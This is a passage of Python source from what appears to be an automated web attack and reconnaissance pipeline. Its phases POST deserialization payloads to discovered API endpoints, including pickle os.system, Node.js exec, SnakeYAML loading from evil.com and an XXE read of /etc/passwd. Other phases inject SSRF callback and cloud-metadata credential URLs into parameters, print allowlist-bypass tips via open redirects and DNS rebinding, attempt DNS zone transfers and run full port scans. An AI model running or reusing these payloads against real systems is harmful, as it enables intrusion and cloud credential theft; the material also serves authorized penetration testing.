    return {"42-LDAP": str(out), "count": len(findings)}


_DESERIAL_PAYLOADS: List[Tuple[str, bytes, str]] = [
    ("PHP", b'O:1:"A":0:{}', "PHP unserialize"),
    ("PHP", b'a:1:{i:0;O:1:"B":0:{}}', "PHP array unserialize"),
    ("PHP", b'O:8:"stdClass":0:{}', "PHP stdClass unserialize"),
    ("PHP", b'a:2:{i:0;s:11:"AAAAA";i:1;R:2;}', "PHP phar deserialization"),
    ("Java", b"\xac\xed\x00\x05", "Java serialization (0xACED0005)"),
    ("Java", b"\xac\xed\x00\x05sr\x00\x12java.lang.Runtime", "Java Runtime serialization"),
    ("Java", b"\xac\xed\x00\x05sr\x00\x11java.lang.Integer", "Java Integer serialization"),
    ("Java", b"\xca\xfe\xba\xbe", "Java class file magic bytes"),
    ("Python", b"(dp0\nS'test'\np1\n.", "Python pickle protocol 0"),
    (
        "Python",
        b"\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x8c\x04eval\x93\x00.",
        "Python pickle protocol 4 eval",
    ),
    ("Python", b"\x80\x03cbuiltins\nexec\n.", "Python pickle protocol 3 exec"),
    ("Python", b"cos\nsystem\n(S'whoami'\ntR.", "Python pickle os.system"),
    ("Ruby", b"\x04\x08o:\x08Object\x00", "Ruby Marshal.load"),
    ("Ruby", b"\x04\x08[\x08o:\x06Nil", "Ruby Marshal.load array"),
    (
        ".NET",
        b"\x00\x01\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00",
        ".NET BinaryFormatter",
    ),
    (
        ".NET",
        b"\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00",
        ".NET DataContractSerializer",
    ),
    (
        "Node.js",
        b'{"__proto__":{"admin":true},"rce":"_$$ND_FUNC$$_function(){}"}',
        "Node.js serialize __proto__ pollution",
    ),
    (
        "Node.js",
        b'{"rce":"_$$ND_FUNC$$_function(require("child_process").exec("id"))()"}',
        "Node.js RCE via ND_FUNC",
    ),
    (
        "YAML",
        b'!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com/"]]]]',
        "YAML deserialization (SnakeYAML)",
    ),
    (
        "YAML",
        b'!!python/object/apply:os.system ["id"]',
        "YAML Python deserialization",
    ),
    (
        "XML",
        b'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        "XML external entity (XXE) deserialization",
    ),
    (
        "Kryo",
        b"\x00\x00\x00\x00\x01\x4b\x52\x59\x4f",
        "Kryo serialization (Java)",
    ),
    (
        "Hessian",
        b"\x63\x31\x30\x30\x30\x30\x30\x30",
        "Hessian serialization (Java)",
    ),
]


async def phase_43_DESERIAL(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"43-DESERIAL"}:
        return {}
    _out = outdir / "deserialization.txt"
    if _out.exists() and not force:
        return {"43-DESERIAL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 43-DESERIAL: insecure deserialization payload probing")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _d_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    api_targets = list(
        {
            u.split("?")[0]
            for u in all_urls
            if any(m in u.lower() for m in ("/api/", "/v1/", "/v2/", "/graphql", "/rpc"))
        }
    )[: _PIPELINE_CFG.sample_endpoints_deserial]
    if not api_targets:
        api_targets = list({u.split("?")[0] for u in all_urls})[
            : _PIPELINE_CFG.sample_endpoints_deserial
        ]
    if not api_targets:
        log("warn", "43-DESERIAL: no API endpoints; skipping")
        return {"43-DESERIAL": str(_out), "count": 0}
    for ep in api_targets:
        for lang, payload, desc in _DESERIAL_PAYLOADS:
            try:
                req = urllib.request.Request(
                    ep,
                    data=payload,
                    method="POST",
                    headers={
                        "Content-Type": "application/octet-stream",
                        "User-Agent": "Mozilla/5.0",
                        **_d_extra_headers,
                    },
                )
                ds, _, db = await _async_urlopen_no_redirect(_d_urlopen, req, timeout=15)
                body = db.decode("utf-8", errors="ignore").lower()
                if ds in (500, 502, 503, 504):
                    findings.append(f"[deserial-crash] {ep} {lang} -> HTTP {ds} ({desc})")
                elif ds in (200, 201, 302):
                    time_indicators = [
                        "error",
                        "exception",
                        "class",
                        "object",
                        "unserialize",
                        "deserialize",
                        "stack trace",
                        "warning",
                        "fatal",
                    ]
                    if any(ind in body for ind in time_indicators):
                        findings.append(
                            f"[deserial-reflected] {ep} {lang} -> error indicators in response ({desc})"
                        )
            except urllib.error.HTTPError as e:
                if e.code in (500, 502, 503, 504, 400):
                    try:
                        err_body = e.read().decode("utf-8", errors="ignore").lower()
                        if any(
                            ind in err_body
                            for ind in [
                                "error",
                                "exception",
                                "class",
                                "object",
                                "stack",
                                "unserialize",
                            ]
                        ):
                            findings.append(
                                f"[deserial-error] {ep} {lang} -> HTTP {e.code} with error details ({desc})"
                            )
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        pass
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
    if not findings:
        findings.append(
            "[deserial] No deserialization vulnerabilities detected (may require manual testing)"
        )
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"43-DESERIAL: {len(findings)} deserialization probes -> {out}")
    return {"43-DESERIAL": str(out), "count": len(findings)}


async def phase_66_SSRF_FULL(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    oast_domain: str = "",
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"66-SSRF-FULL"}:
        return {}
    _out = outdir / "ssrf_full.txt"
    if _out.exists() and not force:
        return {"66-SSRF-FULL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 66-SSRF-FULL: SSRF with OOB callback testing")
    findings: List[str] = []
    _sf_urlopen = _get_urlopener()
    _sf_extra = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        findings.append("[ssrf-full] No URLs available for testing")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"66-SSRF-FULL": str(_out), "count": len(findings)}

    callback = oast_domain or ""
    if not callback:
        findings.append("[ssrf-full] No OAST callback domain available (use --oast-domain)")
    else:
        urls = read_lines(urls_file)[: _PIPELINE_CFG.sample_urls_fuzz]
        ssrf_params = [
            "url",
            "uri",
            "file",
            "path",
            "dest",
            "redirect",
            "return",
            "next",
            "img",
            "image",
            "load",
            "read",
            "document",
            "page",
            "folder",
            "root",
            "host",
            "domain",
            "show",
            "view",
            "dir",
            "location",
            "target",
            "to",
            "out",
            "data",
            "reference",
            "site",
        ]
        for url in urls:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in qs:
                if param.lower() in ssrf_params:
                    new_qs = []
                    for k, vals in qs.items():
                        for v in vals:
                            if k == param:
                                new_qs.append((k, f"http://{callback}/ssrf/{param}"))
                            else:
                                new_qs.append((k, v))
                    test_url = urllib.parse.urlunparse(
                        (
                            parsed.scheme,
                            parsed.netloc,
                            parsed.path,
                            parsed.params,
                            urllib.parse.urlencode(new_qs),
                            parsed.fragment,
                        )
                    )
                    try:
                        req = urllib.request.Request(
                            test_url, headers={"User-Agent": "Mozilla/5.0", **_sf_extra}
                        )
                        status, _, _ = await _async_urlopen(_sf_urlopen, req, timeout=10)
                        if status in (200, 301, 302):
                            findings.append(
                                f"[ssrf-oob-tested] {test_url} → HTTP {status} (check OAST for callback)"
                            )
                    except asyncio.CancelledError:
                        raise
                    except Exception as e:
                        if "timeout" not in str(e).lower():
                            findings.append(f"[ssrf-oob-error] {test_url} → {e}")

    cloud_metadata_endpoints = [
        # AWS
        ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/"),
        ("AWS IMDSv2 token", "http://169.254.169.254/latest/api/token"),
        ("AWS IMDSv2 meta", "http://169.254.169.254/latest/meta-data/"),
        ("AWS IMDSv2 userdata", "http://169.254.169.254/latest/user-data/"),
        ("AWS IMDSv2 iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("AWS ECS v2 creds", "http://169.254.170.2/v2/credentials/"),
        ("AWS ECS v3 creds", "http://169.254.170.2/v3/credentials/"),
        ("AWS ECS v3 meta", "http://169.254.170.2/v3/metadata"),
        ("AWS CodeBuild env", "http://169.254.170.2/v1/environment/"),
        ("AWS ALB container creds", "http://169.254.170.2/..."),
        # GCP
        (
            "GCP metadata recursive",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/?recursive=true",
        ),
        (
            "GCP default token",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        ),
        (
            "GCP identity",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://example.com",
        ),
        ("GCP project", "http://metadata.google.internal/computeMetadata/v1/project/"),
        ("GCP instance", "http://metadata.google.internal/computeMetadata/v1/instance/"),
        ("GCP zone", "http://metadata.google.internal/computeMetadata/v1/instance/zone"),
        (
            "GCP network",
            "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/",
        ),
        # Azure
        ("Azure IMDS instance", "http://169.254.169.254/metadata/instance?api-version=2024-01-01"),
        (
            "Azure IMDS compute",
            "http://169.254.169.254/metadata/instance/compute?api-version=2024-01-01",
        ),
        (
            "Azure IMDS managed",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2024-01-01&resource=https://management.azure.com",
        ),
        ("Azure IMDS 2021", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        # DigitalOcean
        ("DigitalOcean meta", "http://169.254.169.254/metadata/v1.json"),
        ("DigitalOcean docker", "http://169.254.169.254/metadata/v1/docker"),
        ("DigitalOcean userdata", "http://169.254.169.254/metadata/v1/user-data"),
        ("DigitalOcean ssh keys", "http://169.254.169.254/metadata/v1/keys"),
        # Alibaba Cloud
        ("Alibaba meta", "http://100.100.100.200/latest/meta-data/"),
        ("Alibaba userdata", "http://100.100.100.200/latest/user-data/"),
        ("Alibaba ram", "http://100.100.100.200/latest/meta-data/ram/security-credentials/"),
        # Oracle Cloud (OCI)
        ("OCI v2 instance", "http://169.254.169.254/opc/v2/instance/"),
        ("OCI v2 attest", "http://169.254.169.254/opc/v2/instance/attestation"),
        # OpenStack
        ("OpenStack meta", "http://169.254.169.254/openstack/latest/meta_data.json"),
        ("OpenStack network", "http://169.254.169.254/openstack/latest/network_data.json"),
        ("OpenStack userdata", "http://169.254.169.254/openstack/latest/user_data"),
        # IBM Cloud
        ("IBM Cloud meta", "http://169.254.169.254/metadata/v1/instance?version=2024-01-01"),
        # Cloud Run / Cloud Functions
        (
            "GCP Cloud Run meta",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://run.app",
        ),
    ]
    findings.append("")
    findings.append("--- Cloud Metadata 2024+ Targets ---")
    for cloud_name, meta_url in cloud_metadata_endpoints:
        findings.append(f"  [{cloud_name}] {meta_url}")

    # Blind SSRF with time-based detection
    import time as _time_module

    ssrf_time_params = [
        "url",
        "uri",
        "file",
        "path",
        "dest",
        "redirect",
        "return",
        "next",
        "img",
        "image",
        "load",
        "read",
        "document",
        "page",
        "folder",
        "root",
        "host",
        "domain",
        "show",
        "view",
        "dir",
        "location",
        "target",
        "to",
        "out",
        "data",
        "reference",
        "site",
        "endpoint",
        "api",
    ]
    time_payloads = [
        ("sleep-5-localhost", "http://127.0.0.1:8080/sleep?sleep=5000", 5.0),
        ("sleep-5-internal", "http://10.0.0.1:8080/sleep?sleep=5000", 5.0),
        ("sleep-3-localhost", "http://127.0.0.1:8080/sleep?sleep=3000", 3.0),
    ]
    if "urls" in dir():
        for url in urls[: _PIPELINE_CFG.sample_urls_fuzz]:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in qs:
                if param.lower() in ssrf_time_params:
                    for time_name, time_url, expected_delay in time_payloads:
                        new_qs = []
                        for k, vals in qs.items():
                            for v in vals:
                                if k == param:
                                    new_qs.append((k, time_url))
                                else:
                                    new_qs.append((k, v))
                        test_url = urllib.parse.urlunparse(
                            (
                                parsed.scheme,
                                parsed.netloc,
                                parsed.path,
                                parsed.params,
                                urllib.parse.urlencode(new_qs),
                                parsed.fragment,
                            )
                        )
                        try:
                            start = _time_module.time()
                            req = urllib.request.Request(
                                test_url,
                                headers={"User-Agent": "Mozilla/5.0", **_sf_extra},
                            )
                            try:
                                _, _, _ = await _async_urlopen(
                                    _sf_urlopen, req, timeout=int(expected_delay + 3)
                                )
                            except Exception:
                                pass
                            elapsed = _time_module.time() - start
                            if elapsed >= expected_delay * 0.8:
                                findings.append(
                                    f"[ssrf-time-delay] {test_url} → {param}={time_name} delay={elapsed:.1f}s (potential blind SSRF)"
                                )
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            continue

    # IMDSv2 Bypass via PUT
    findings.append("")
    findings.append("--- IMDSv2 Bypass (PUT Token Request) ---")
    findings.append("  [imdsv2-bypass] To bypass IMDSv2, first send PUT request to get token:")
    findings.append("  [imdsv2-bypass] PUT http://169.254.169.254/latest/api/token")
    findings.append("  [imdsv2-bypass] Header: X-aws-ec2-metadata-token-ttl-seconds: 21600")
    findings.append("  [imdsv2-bypass] Response body = token string")
    findings.append("  [imdsv2-bypass] Then use: GET http://169.254.169.254/latest/meta-data/")
    findings.append("  [imdsv2-bypass] Header: X-aws-ec2-metadata-token: <token>")
    if "urls" in dir():
        for url in urls[:5]:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in qs:
                if param.lower() in ssrf_params:
                    for meta_url in [
                        "http://169.254.169.254/latest/api/token",
                        "http://169.254.169.254/latest/meta-data/",
                    ]:
                        new_qs = []
                        for k, vals in qs.items():
                            for v in vals:
                                if k == param:
                                    new_qs.append((k, meta_url))
                                else:
                                    new_qs.append((k, v))
                        test_url = urllib.parse.urlunparse(
                            (
                                parsed.scheme,
                                parsed.netloc,
                                parsed.path,
                                parsed.params,
                                urllib.parse.urlencode(new_qs),
                                parsed.fragment,
                            )
                        )
                        try:
                            req = urllib.request.Request(
                                test_url,
                                headers={
                                    "User-Agent": "Mozilla/5.0",
                                    "X-aws-ec2-metadata-token-ttl-seconds": "21600",
                                    **_sf_extra,
                                },
                            )
                            meta_status, _, meta_body = await _async_urlopen(
                                _sf_urlopen, req, timeout=10
                            )
                            meta_text = meta_body.decode("utf-8", errors="ignore")
                            if meta_status == 200 and len(meta_text) > 10:
                                findings.append(
                                    f"[imdsv2-candidate] {test_url} → {meta_url} HTTP {meta_status} ({len(meta_body)} bytes)"
                                )
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            continue

    # PDF generator SSRF test
    pdf_ssrf_params = [
        ("url", "?url="),
        ("src", "?src="),
        ("pdf", "?pdf="),
        ("html", "?html="),
        ("page", "?page="),
        ("render", "?render="),
    ]
    pdf_ssrf_targets = (
        [t for t in urls if any(f"{p}=" in t.lower() for p, _ in pdf_ssrf_params)]
        if "urls" in dir()
        else []
    )
    if pdf_ssrf_targets:
        findings.append("")
        findings.append("--- PDF Generator SSRF (wkhtmltopdf/puppeteer/prince) ---")
        for param_name, param_qs in pdf_ssrf_params:
            matched = [u for u in pdf_ssrf_targets if param_qs in u.lower()]
            if matched:
                for u in matched[:3]:
                    findings.append(
                        f"  [pdf-ssrf] {u} — test {param_name} with http://{callback or 'OAST'}/pdf-ssrf"
                    )

    # Open redirect chaining for SSRF
    findings.append("")
    findings.append("--- Open Redirect Chaining for SSRF ---")
    findings.append("  [ssrf-chain] If SSRF is blocked by host allowlist, try:")
    findings.append("  [ssrf-chain] 1. Find an open redirect on the target domain")
    findings.append("  [ssrf-chain] 2. Use: ?url=https://target.com/redirect?next=http://internal/")
    findings.append(
        "  [ssrf-chain] 3. Use: ?url=https://target.com/redirect?url=http://169.254.169.254/"
    )

    # DNS rebinding note
    findings.append("")
    findings.append("--- DNS Rebinding Bypass ---")
    findings.append("  [ssrf-dns-rebinding] To bypass host-based allowlists, use DNS rebinding:")
    findings.append("  [ssrf-dns-rebinding] Services: rbndr.us, 1u.ms, lock.cmpxchg.io")
    findings.append(
        "  [ssrf-dns-rebinding] Example: http://7f000001.1u.ms/ (resolves to 127.0.0.1 then changes)"
    )
    findings.append(
        "  [ssrf-dns-rebinding] Use with short TTL (60s) and dual A records (legit IP + internal IP)"
    )

    if not findings:
        findings.append("[ssrf-full] No SSRF parameters found or tested")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"66-SSRF-FULL: {len(findings)} findings → {out}")
    return {"66-SSRF-FULL": str(_out), "count": len(findings)}


async def phase_69_DNSZT(
    domain: str,
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"69-DNSZT"}:
        return {}
    _out = outdir / "dns_zone_transfer.txt"
    if _out.exists() and not force:
        return {"69-DNSZT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 69-DNSZT: DNS zone transfer")
    findings: List[str] = []

    async def _get_nameservers() -> List[str]:
        ns: List[str] = []
        if t.has("dig"):
            try:
                rc, stdout, _ = await _run_cmd_clear_proxy(["dig", "+short", "NS", domain])
                if rc == 0:
                    ns = [
                        ln.decode().strip().rstrip(".") for ln in stdout.splitlines() if ln.strip()
                    ]
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
        if not ns:
            try:
                rc, stdout, _ = await _run_cmd_clear_proxy(["nslookup", "-type=NS", domain])
                if rc == 0:
                    for ln in stdout.decode(errors="ignore").splitlines():
                        m = re.search(r"nameserver\s*=\s*(\S+)", ln, re.IGNORECASE)
                        if m:
                            ns.append(m.group(1).rstrip("."))
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
        return ns

    nameservers = await _get_nameservers()
    if not nameservers:
        findings.append("[dns-zt] No nameservers found for domain")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"69-DNSZT": str(_out), "count": len(findings)}

    for ns in nameservers:
        if t.has("dig"):
            try:
                rc, stdout, stderr = await _run_cmd_clear_proxy(
                    ["dig", "@" + ns, domain, "AXFR"], timeout=15
                )
                output = stdout.decode(errors="ignore")
                err_text = stderr.decode(errors="ignore")
                if (
                    "Transfer failed" in err_text
                    or "refused" in err_text.lower()
                    or "timed out" in err_text.lower()
                ):
                    findings.append(f"[dns-zt-secure] {ns} — zone transfer refused (secure)")
                elif any(
                    ln.strip() and "IN" in ln
                    for ln in output.splitlines()
                    if "SOA" in ln or "NS" in ln or "A" in ln
                ):
                    n_records = len([ln for ln in output.splitlines() if ln.strip()])
                    findings.append(
                        f"[dns-zt-vulnerable] {ns} — zone transfer SUCCEEDED ({n_records} records)"
                    )
                    for ln in output.splitlines()[:20]:
                        findings.append(f"  {ln.strip()}")
                    if n_records > 20:
                        findings.append(f"  … and {n_records - 20} more records")
                else:
                    findings.append(f"[dns-zt-checked] {ns} — no zone data returned")
            except asyncio.TimeoutError:
                findings.append(f"[dns-zt-timeout] {ns} — zone transfer timed out")
            except asyncio.CancelledError:
                raise
            except Exception as e:
                findings.append(f"[dns-zt-error] {ns} — {e}")

    if not findings:
        findings.append("[dns-zt] No zone transfer tests completed")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"69-DNSZT: {len(findings)} findings → {out}")
    return {"69-DNSZT": str(_out), "count": len(findings)}


# ────────────────── Phase 70-PORTFULL: full port scan on top target ──────
async def phase_70_PORTFULL(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"70-PORTFULL"}:
        return {}
    _out = outdir / "ports_full.txt"
    if _out.exists() and not force:
        return {"70-PORTFULL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 70-PORTFULL: full port scan (-p-) on top target")
    findings: List[str] = []
    hosts_file = outdir / "hosts.txt"
    if not hosts_file.exists() or not read_lines(hosts_file):
        findings.append("[portfull] No hosts available")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"70-PORTFULL": str(_out), "count": len(findings)}

    top_hosts = [h.split("://")[-1].split("/")[0].split(":")[0] for h in read_lines(hosts_file)][:3]
    for host in top_hosts:
        port_out: Optional[Path] = None
        try:
            if t.has("nmap"):
                port_out = outdir / f"ports_full_{_safe_name(host)}.txt"
                _full_timing = (
                    ["-T3", "--min-rate", "200"]
                    if _PIPELINE_CFG.safe_mode
                    else ["-T4", "--min-rate", "500"]
                )
                _full_timeout = 1800 if _PIPELINE_CFG.safe_mode else 3600
                await _run(
                    f"nmap-full-{_safe_name(host)[:16]}",
                    ["nmap", "-Pn", "-p-", "--open"] + _full_timing + ["-oG", str(port_out), host],
                    _full_timeout,
                    outdir,
                )
                if port_out.exists():
                    port_lines = read_lines(port_out)
                    open_ports = [ln for ln in port_lines if "/open/" in ln]
                    if open_ports:
                        for ln in open_ports:
                            findings.append(f"[portfull-found] {host} → {ln.strip()}")
                    else:
                        findings.append(f"[portfull-clean] {host} — no open ports beyond top-1000")
            elif t.has("naabu"):
                port_out = outdir / f"ports_full_{_safe_name(host)}.txt"
                await _run(
                    f"naabu-full-{_safe_name(host)[:16]}",
                    ["naabu", "-silent", "-host", host, "-p", "-", "-o", str(port_out)],
                    3600,
                    outdir,
                )
                if port_out.exists() and read_lines(port_out):
                    for ln in read_lines(port_out):
                        findings.append(f"[portfull-found] {ln.strip()}")
                else:
                    findings.append(f"[portfull-clean] {host} — no additional ports found")
        finally:
            if port_out and port_out.exists():
                port_out.unlink(missing_ok=True)

    if not findings:
        findings.append("[portfull] No full port scan performed (nmap/naabu required)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"70-PORTFULL: {len(findings)} findings → {out}")
    return {"70-PORTFULL": str(_out), "count": len(findings)}
